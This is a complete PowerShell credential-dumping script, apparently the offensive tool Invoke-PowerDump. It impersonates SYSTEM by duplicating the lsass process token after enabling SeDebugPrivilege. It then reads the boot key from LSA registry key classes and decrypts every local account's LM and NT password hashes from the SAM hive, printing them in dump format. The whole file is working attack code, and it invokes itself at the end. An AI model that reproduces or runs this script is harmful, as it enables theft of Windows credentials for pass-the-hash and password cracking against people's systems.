function Invoke-PowerDump
{

$sign = @"
using System;
using System.Runtime.InteropServices;
public static class priv
{
    [DllImport("shell32.dll")]
    public static extern bool IsUserAnAdmin();
}
"@
    $adminasembly = Add-Type -TypeDefinition $sign -Language CSharp -PassThru
    function ElevatePrivs
    {
$signature = @"
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
     public struct TokPriv1Luid
     {
         public int Count;
         public long Luid;
         public int Attr;
     }

    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const int TOKEN_QUERY = 0x00000008;
    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;

    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const UInt32 TOKEN_DUPLICATE = 0x0002;
    public const UInt32 TOKEN_IMPERSONATE = 0x0004;
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
      TOKEN_ADJUST_SESSIONID);

    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege";
    public const int ANYSIZE_ARRAY = 1;

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
      public UInt32 LowPart;
      public UInt32 HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
       public LUID Luid;
       public UInt32 Attributes;
    }


    public struct TOKEN_PRIVILEGES {
      public UInt32 PrivilegeCount;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)]
      public LUID_AND_ATTRIBUTES [] Privileges;
    }

    [DllImport("advapi32.dll", SetLastError=true)]
     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int
        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);


    [DllImport("advapi32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool SetThreadToken(
      IntPtr PHThread,
      IntPtr Token
    );

    [DllImport("advapi32.dll", SetLastError=true)]
     [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool OpenProcessToken(IntPtr ProcessHandle,
       UInt32 DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

    [DllImport("kernel32.dll", ExactSpelling = true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
"@

          $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
          if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
            Write-Warning "Run the Command as an Administrator"
            Break
          }

          Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv
          $adjPriv = [AdjPriv.AdjPriv]
          [long]$luid = 0

          $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid
          $tokPriv1Luid.Count = 1
          $tokPriv1Luid.Luid = $luid
          $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED

          $retVal = $adjPriv::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid)

          [IntPtr]$htoken = [IntPtr]::Zero
          $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken)


          $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES
          $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)

          if(-not($retVal)) {
            [System.Runtime.InteropServices.marshal]::GetLastWin32Error()
            Break
          }

          $process = (Get-Process -Name lsass)
          #$process.name
          [IntPtr]$hlsasstoken = [IntPtr]::Zero
          $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -BOR [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken)

          [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero
          $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle)

          $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle)

          if(-not($retVal)) {
            [System.Runtime.InteropServices.marshal]::GetLastWin32Error()
          }
      }
      function LoadApi
        {
$code = @"
using System;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
namespace PowerDump
{
    public class Native
    {
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
     public static extern int RegOpenKeyEx(
        int hKey,
        string subKey,
        int ulOptions,
        int samDesired,
        out int hkResult);
    [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")]
    extern public static int RegEnumKeyEx(
        int hkey,
        int index,
        StringBuilder lpName,
        ref int lpcbName,
        int reserved,
        StringBuilder lpClass,
        ref int lpcbClass,
        out long lpftLastWriteTime);
    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    extern public static int RegQueryInfoKey(
        int hkey,
        StringBuilder lpClass,
        ref int lpcbClass,
        int lpReserved,
        out int lpcSubKeys,
        out int lpcbMaxSubKeyLen,
        out int lpcbMaxClassLen,
        out int lpcValues,
        out int lpcbMaxValueNameLen,
        out int lpcbMaxValueLen,
        out int lpcbSecurityDescriptor,
        IntPtr lpftLastWriteTime);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegCloseKey(
        int hKey);
        }
    } // end namespace PowerDump
    public class Shift {
        public static int   Right(int x,   int count) { return x >> count; }
        public static uint  Right(uint x,  int count) { return x >> count; }
        public static long  Right(long x,  int count) { return x >> count; }
        public static ulong Right(ulong x, int count) { return x >> count; }
        public static int    Left(int x,   int count) { return x << count; }
        public static uint   Left(uint x,  int count) { return x << count; }
        public static long   Left(long x,  int count) { return x << count; }
        public static ulong  Left(ulong x, int count) { return x << count; }
    }
"@
           $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
           $dllName = [PsObject].Assembly.Location
           $compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
           $assemblies = @("System.dll", $dllName)
           $compilerParameters.ReferencedAssemblies.AddRange($assemblies)
           $compilerParameters.GenerateInMemory = $true
           $compilerResults = $provider.CompileAssemblyFromSource($compilerParameters, $code)
           if($compilerResults.Errors.Count -gt 0) {
             $compilerResults.Errors | % { Write-Error ("{0}:`t{1}" -f $_.Line,$_.ErrorText) }
           }
        }
        $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
        $almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
        $empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
        $empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
        $odd_parity = @(
          1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
          16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
          32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
          49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
          64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
          81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
          97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
          112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
          128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
          145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
          161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
          176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
          193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
          208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
          224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
          241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
        );
        function sid_to_key($sid)
        {
            $s1 = @();
            $s1 += [char]($sid -band 0xFF);
            $s1 += [char]([Shift]::Right($sid,8) -band 0xFF);
            $s1 += [char]([Shift]::Right($sid,16) -band 0xFF);
            $s1 += [char]([Shift]::Right($sid,24) -band 0xFF);
            $s1 += $s1[0];
            $s1 += $s1[1];
            $s1 += $s1[2];
            $s2 = @();
            $s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2];
            $s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2];
            return ,((str_to_key $s1),(str_to_key $s2));
        }
        function str_to_key($s)
        {
            $key = @();
            $key += [Shift]::Right([int]($s[0]), 1 );
            $key += [Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [Shift]::Right([int]($s[1]),2);
            $key += [Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [Shift]::Right([int]($s[2]),3);
            $key += [Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [Shift]::Right([int]($s[3]),4);
            $key += [Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [Shift]::Right([int]($s[4]),5);
            $key += [Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [Shift]::Right([int]($s[5]),6);
            $key += [Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [Shift]::Right([int]($s[6]),7);
            $key += $([int]($s[6]) -band 0x7F);
            0..7 | %{
                $key[$_] = [Shift]::Left($key[$_], 1);
                $key[$_] = $odd_parity[$key[$_]];
                }
            return ,$key;
        }
        function NewRC4([byte[]]$key)
        {
            return new-object Object |
            Add-Member NoteProperty key $key -PassThru |
            Add-Member NoteProperty S $null -PassThru |
            Add-Member ScriptMethod init {
                if (-not $this.S)
                {
                    [byte[]]$this.S = 0..255;
                    0..255 | % -begin{[long]$j=0;}{
                        $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                        $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                        }
                }
            } -PassThru |
            Add-Member ScriptMethod "encrypt" {
                $data = $args[0];
                $this.init();
                $outbuf = new-object byte[] $($data.Length);
                $S2 = $this.S[0..$this.S.Length];
                0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
                    $i = ($i+1) % $S2.Length;
                    $j = ($j + $S2[$i]) % $S2.Length;
                    $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
                    $a = $data[$_];
                    $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
                    $outbuf[$_] = ($a -bxor $b);
                }
                return ,$outbuf;
            } -PassThru
        }
        function des_encrypt([byte[]]$data, [byte[]]$key)
        {
            return ,(des_transform $data $key $true)
        }
        function des_decrypt([byte[]]$data, [byte[]]$key)
        {
            return ,(des_transform $data $key $false)
        }
        function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
        {
            $des = new-object Security.Cryptography.DESCryptoServiceProvider;
            $des.Mode = [Security.Cryptography.CipherMode]::ECB;
            $des.Padding = [Security.Cryptography.PaddingMode]::None;
            $des.Key = $key;
            $des.IV = $key;
            $transform = $null;
            if ($doEncrypt) {$transform = $des.CreateEncryptor();}
            else{$transform = $des.CreateDecryptor();}
            $result = $transform.TransformFinalBlock($data, 0, $data.Length);
            return ,$result;
        }
        function Get-RegKeyClass([string]$key, [string]$subkey)
        {
            switch ($Key) {
                "HKCR" { $nKey = 0x80000000} #HK Classes Root
                "HKCU" { $nKey = 0x80000001} #HK Current User
                "HKLM" { $nKey = 0x80000002} #HK Local Machine
                "HKU"  { $nKey = 0x80000003} #HK Users
                "HKCC" { $nKey = 0x80000005} #HK Current Config
                default {
                    throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
                }
            }
            $KEYQUERYVALUE = 0x1;
            $KEYREAD = 0x19;
            $KEYALLACCESS = 0x3F;
            $result = "";
            [int]$hkey=0
            if (-not [PowerDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
            {
                $classVal = New-Object Text.Stringbuilder 1024
                [int]$len = 1024
                if (-not [PowerDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
                    [ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
                {
                    $result = $classVal.ToString()
                }
                else
                {
                    Write-Error "RegQueryInfoKey failed";
                }
                [PowerDump.Native]::RegCloseKey($hkey) | Out-Null
            }
            else
            {
                Write-Error "Cannot open key";
            }
            return $result;
        }
        function RC4_Get-HBootKey
        {
            param([byte[]]$bootkey);
            $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
            $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
            $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
            if (-not $k) {return $null}
            [byte[]]$F = $k.GetValue("F");
            if (-not $F) {return $null}
            $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
            $rc4 = NewRC4 $rc4key;
            return ,($rc4.encrypt($F[0x80..0xA0]));
        }
        function RC4_DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
        {
            [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
            # LM Hash
            if ($enc_lm_hash.Length -lt 20)
            {
                $lmhash = 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee
            }
            else{
                $lmhash = RC4_DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
            }

            # NT Hash
            if ($enc_nt_hash.Length -lt 20)
            {
                $nthash = 0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0
            }
            else{
                $nthash = RC4_DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
            }
            return ,($lmhash,$nthash)
        }
        function RC4_DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
        {
            $deskeys = sid_to_key $rid;
            $md5 = [Security.Cryptography.MD5]::Create();
            $rc4_key = $md5.ComputeHash($hbootkey[0x00..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
            $rc4 = NewRC4 $rc4_key;
            $obfkey = $rc4.encrypt($enc_hash[0x04..$(0x04+0x0f)]);
            $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
                (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
            return ,$hash;
        }
        function Get-BootKey
        {
            $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
            $b = new-object byte[] $($s.Length/2);
            0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
            $b2 = new-object byte[] 16;
            0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
            return ,$b2;
        }
        function Create-AesManagedObject($key, $IV) 
        {
            $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
            $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            $aesManaged.BlockSize = 128
            $aesManaged.KeySize = 256
            if ($IV) {
                if ($IV.getType().Name -eq "String") {
                    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
                }
                else {
                    $aesManaged.IV = $IV
                }
            }
            if ($key) {
                if ($key.getType().Name -eq "String") {
                    $aesManaged.Key = [System.Convert]::FromBase64String($key)
                }
                else {
                    $aesManaged.Key = $key
                }
            }
            $aesManaged
        }
        function Decrypt-String($key, $encryptedStringWithIV) 
        {
            $bytes = $encryptedStringWithIV
            $IV = $bytes[0x00..0x0f]
            $aesManaged = Create-AesManagedObject $key $IV
            $decryptor = $aesManaged.CreateDecryptor();
            $unencryptedData = $decryptor.TransformFinalBlock($bytes,16, $bytes.Length - 16);
            $aesManaged.Dispose()
            $unencryptedData

        }
        function Get-HBootKey
        {
            param([byte[]]$bootkey);
            $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
            $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
            $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
            if (-not $k) {return $null}
            [byte[]]$F = $k.GetValue("F");
            if (-not $F) {return $null}

            # offset 0x88 from 'F' (16 bytes)
            $data = $F[$(0x88)..$(0x88+0x0f)]

            # offset 0x78 from 'F' (16 bytes)
            $iv = $F[$(0x78)..$(0x78+0x0f)]
            $key = $bootkey
            $iv_data = $iv+$data
            $unencryptedData = Decrypt-String -key $key -encryptedStringWithIV $iv_data
            return ,$unencryptedData

        }
        function Get-UserName([byte[]]$V)
        {
            if (-not $V) {return $null};
            $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
            $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
            return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
        }
        function Get-UserHashes($u, [byte[]]$hbootkey)
        {
            [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;

            if($u -ne $null){
                $enc_nt_hash = $u.V[$($u.nt_HashOffset)..$($u.nt_HashOffset+$u.nt_len)];
                $enc_lm_hash = $u.V[$($u.lm_HashOffset)..$($u.lm_HashOffset+$u.lm_len)];
                 # If hash length = 0x38 then compute AES Hash
                if ($u.nt_len -eq 0x38){
                    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
                    }
                # If hash length = 0x18 then compute RC4 Hash
                elseif ($u.nt_len -eq 0x18){
                    $hbootkey = RC4_Get-HBootKey
                    return ,(RC4_DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
                }
            }

            else{
                return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
            }
        }
        function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
        {
            [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
            # LM Hash
            if ($enc_lm_hash.Length -lt 40)
            {
                $lmhash = 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee
            }
            else{
                $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash;
            }

            # NT Hash
            if ($enc_nt_hash.Length -lt 40)
            {
                $nthash = 0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0
            }
            else{
                $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash;
            }
            return ,($lmhash,$nthash)
        }
        function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash)
        {
            $deskeys = sid_to_key $rid;
            $key = $hbootkey[0x00..0x0f]
            $iv = $enc_hash[0x08..$(0x08+0x0f)]
            $data = $enc_hash[0x18..$(0x18+0x0f)]
            $data_iv = $iv+$data

            $obfkey = Decrypt-String -key $key -encryptedStringWithIV $data_iv
            $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
                (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
            return ,$hash ;

        }
        function Get-UserKeys
        {
            ls HKLM:\SAM\SAM\Domains\Account\Users |
                where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
                    Add-Member AliasProperty KeyName PSChildName -PassThru |
                    Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
                    Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
                    Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
                    Add-Member ScriptProperty lm_HashOffset {[System.BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru |
                    Add-Member ScriptProperty lm_len {[System.BitConverter]::ToUInt32($this.GetValue("V")[0xa0..0xa3],0)} -PassThru |
                    Add-Member ScriptProperty nt_HashOffset {[System.BitConverter]::ToUInt32($this.GetValue("V")[0xa8..0xab],0) + 0xCC} -PassThru |
                    Add-Member ScriptProperty nt_len {[System.BitConverter]::ToUInt32($this.GetValue("V")[0xac..0xaf],0)} -PassThru
        }
        function DumpHashes
        {
            LoadApi
            $bootkey = Get-BootKey;
            $hbootKey = Get-HBootKey $bootkey;
            $hashes = Get-UserHashes $_ $hBootKey
            Get-UserKeys | %{
                $hashes = Get-UserHashes $_ $hBootKey;
                "{0}:{1}:{2}:{3}" -f ($_.UserName,$_.Rid,
                    [System.BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
                    [System.BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
            }
        }
        if ([priv]::IsUserAnAdmin())
        {
            if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
            {
                DumpHashes
            }
            else
            {
                ElevatePrivs
                if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
                {
                    DumpHashes
                }
            }
        }
        else
        {
            Write-Error "Administrator or System privileges necessary."
        }
}

Invoke-PowerDump